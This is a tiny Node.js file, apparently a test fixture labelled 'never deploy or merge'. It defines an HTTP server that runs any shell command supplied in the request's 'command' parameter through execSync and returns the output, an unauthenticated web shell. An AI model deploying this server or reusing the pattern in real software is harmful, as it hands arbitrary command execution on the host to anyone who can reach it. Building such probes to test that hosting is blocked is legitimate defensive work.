// Temporary hosted denial fixture: never deploy or merge this probe.
import { createServer } from 'node:http';
import { execSync } from 'node:child_process';

export const probe = createServer((request, response) => {
  const command = new URL(request.url, 'http://localhost').searchParams.get('command');
  response.end(execSync(command));
});
